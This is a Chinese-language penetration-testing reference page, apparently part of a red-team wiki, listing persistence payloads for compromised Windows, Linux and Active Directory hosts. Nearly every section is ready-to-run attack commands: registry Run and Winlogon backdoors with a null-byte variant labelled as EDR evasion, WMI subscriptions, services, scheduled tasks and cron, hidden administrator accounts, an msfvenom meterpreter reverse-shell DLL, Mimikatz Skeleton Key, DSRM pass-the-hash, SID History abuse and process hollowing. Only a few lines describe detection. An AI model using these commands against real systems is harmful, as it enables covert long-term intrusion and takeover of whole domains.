# 内网/后渗透 — 权限维持 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:服务 / 计划任务 / 注册表 / WMI 订阅 / Logon Script / SSP / Skeleton Key / Golden Ticket 持久化

---

### 注册表持久化  `persistence-registry`
通过注册表实现权限维持
子类：**注册表** · tags: `persistence` `registry` `windows` `autorun`

**前置条件：** 已获得目标机器权限；管理员权限；Windows系统

**攻击链：**

**1. Run键持久化**  _[windows]_
_添加Run键实现开机自启_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**2. RunOnce键**  _[windows]_
_RunOnce键，执行一次后删除_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**3. Winlogon Helper**  _[windows]_
_修改Userinit实现持久化_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**4. 服务持久化**  _[windows]_
_创建服务实现持久化_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR 绕过变体：**

**1. 隐藏注册表键**
_使用空字节隐藏注册表键_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。

**OPSEC：** Run键是最常见的持久化方式，容易被检测；考虑使用更隐蔽的方式；定期检查注册表异常项

---

### WMI持久化  `persistence-wmi`
通过WMI事件订阅实现持久化
子类：**WMI** · tags: `wmi` `persistence` `windows`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建事件过滤器**  _[windows]_
_创建WMI事件过滤器_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**2. 创建事件消费者**  _[windows]_
_创建命令行消费者_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**3. 绑定过滤器和消费者**  _[windows]_
_绑定触发执行_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```

---

### 启动文件夹持久化  `persistence-startup`
通过启动文件夹实现持久化
子类：**启动文件夹** · tags: `startup` `persistence` `windows`

**前置条件：** 写入权限

**攻击链：**

**1. 当前用户启动文件夹**  _[windows]_
_当前用户启动_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**2. 所有用户启动文件夹**  _[windows]_
_所有用户启动_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### 服务持久化  `persistence-service`
通过创建服务实现持久化
子类：**服务** · tags: `service` `persistence` `windows`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建服务**  _[windows]_
_创建自启动服务_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```

**2. 启动服务**  _[windows]_
_启动服务_
```
sc start evilsvc
```

---

### DLL注入持久化  `persistence-dll-injection`
通过DLL注入实现持久化
子类：**DLL注入** · tags: `dll` `injection` `persistence`

**前置条件：** 代码执行权限；目标进程

**攻击链：**

**1. 创建恶意DLL**  _[linux]_
_生成恶意DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**2. 注入DLL**  _[windows]_
_将DLL注入到运行进程_
```
使用工具如InjectDLL、PowerShell等注入到目标进程
```

**3. AppInit_DLLs**  _[windows]_
_通过AppInit_DLLs注入_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```

---

### 后门用户  `persistence-backdoor-user`
创建后门用户账户
子类：**用户** · tags: `user` `backdoor` `persistence`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建用户**  _[windows]_
_创建管理员用户_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**2. 隐藏用户**  _[windows]_
_创建隐藏用户（$结尾）_
```
net user backdoor$ P@ssw0rd /add
```

**3. 修改注册表隐藏**  _[windows]_
_通过注册表隐藏用户_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```

---

### 隐藏用户  `persistence-hidden-user`
创建隐藏的管理员用户
子类：**隐藏用户** · tags: `hidden` `user` `persistence`

**前置条件：** SYSTEM权限

**攻击链：**

**1. 创建用户**  _[windows]_
_创建$结尾用户_
```
net user hidden$ P@ssw0rd /add
```

**2. 添加到管理员组**  _[windows]_
_添加管理员权限_
```
net localgroup administrators hidden$ /add
```

**3. 注册表隐藏**  _[windows]_
_通过注册表完全隐藏_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
修改F值
reg import user.reg
```

---

### 计划任务持久化  `persistence-scheduled`
通过计划任务实现持久化
子类：**计划任务** · tags: `persistence` `scheduled` `task`

**前置条件：** 创建任务权限

**攻击链：**

**1. 创建登录任务**  _[windows]_
_创建登录时运行的任务_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```

**2. 创建定时任务**  _[windows]_
_创建每5分钟运行的任务_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**3. PowerShell创建**  _[windows]_
_使用PowerShell创建任务_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**4. Linux Cron**  _[linux]_
_Linux计划任务_
```
crontab -e
添加: * * * * * /tmp/backdoor.sh
或: @reboot /tmp/backdoor.sh
```

---

### Skeleton Key后门  `skeleton-key`
在域控制器植入万能密码
子类：**域后门** · tags: `skeleton-key` `backdoor` `domain`

**前置条件：** 域管理员权限；访问域控制器

**攻击链：**

**1. 植入Skeleton Key**  _[windows]_
_使用Mimikatz植入_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

**2. 使用万能密码**  _[windows]_
_使用万能密码登录_
```
万能密码: mimikatz
任何域用户都可以使用mimikatz作为密码登录
```

**3. 检测方法**  _[windows]_
_检测Skeleton Key_
```
检查LSASS内存:
Get-Process lsass
使用EDR检测内存注入
```

---

### DSRM后门  `dsrm-backdoor`
利用DSRM账户建立后门
子类：**域后门** · tags: `dsrm` `backdoor` `domain`

**前置条件：** 域管理员权限；访问域控制器

**攻击链：**

**1. 获取DSRM密码**  _[windows]_
_获取DSRM账户哈希_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
或
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**2. 同步DSRM密码**  _[windows]_
_同步DSRM密码与域管理员_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```

**3. 启用DSRM账户**  _[windows]_
_允许DSRM账户远程登录_
```
修改注册表:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**4. 使用DSRM登录**  _[windows]_
_使用DSRM账户_
```
使用DSRM账户哈希:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
或使用Pass-the-Hash
```

---

### SID History后门  `sid-history`
利用SID History建立后门
子类：**域后门** · tags: `sid-history` `backdoor` `domain`

**前置条件：** 域管理员权限

**攻击链：**

**1. 添加SID History**  _[windows]_
_添加SID History_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
将域管SID添加到普通用户
```

**2. 验证SID History**  _[windows]_
_检查SID History_
```
Get-ADUser backdoor_user -Properties sidHistory
或
whoami /all
```

**3. 使用后门**  _[windows]_
_使用后门账户_
```
使用backdoor_user登录
自动获得域管理员权限
```

---

### 进程镂空持久化  `persistence-process-hollowing`
利用进程镂空技术实现持久化
子类：**进程注入** · tags: `process-hollowing` `persistence` `injection`

**前置条件：** 代码执行权限

**攻击链：**

**1. 进程镂空原理**  _[windows]_
_进程镂空原理_
```
1. 创建合法进程(挂起状态)
2. 替换进程内存
3. 恢复执行
```

**2. C#实现**  _[windows]_
_C#进程镂空_
```
using System.Runtime.InteropServices;
// 创建挂起进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// 替换内存
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**3. 检测方法**  _[windows]_
_检测进程镂空_
```
检查进程内存:
- 进程路径与内存内容不匹配
- 异常的内存区域
- 使用EDR检测
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`16-recon.md`](16-recon.md) · 下一篇:[`18-exchange.md`](18-exchange.md)
